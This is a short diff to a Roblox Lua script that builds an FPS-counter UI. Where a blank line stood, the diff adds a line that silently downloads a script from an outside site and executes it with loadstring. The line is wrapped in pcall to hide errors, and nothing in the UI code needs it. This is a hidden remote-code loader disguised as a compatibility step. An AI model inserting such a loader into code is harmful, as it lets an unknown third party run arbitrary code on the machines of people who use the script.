@@ -1,5 +1,5 @@
 -- // ~ ui by spec ~ //
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 -- // ~ this shit makes the ui elements
 local FPS = Instance.new("ScreenGui") 
 local fps_counter = Instance.new("TextLabel")
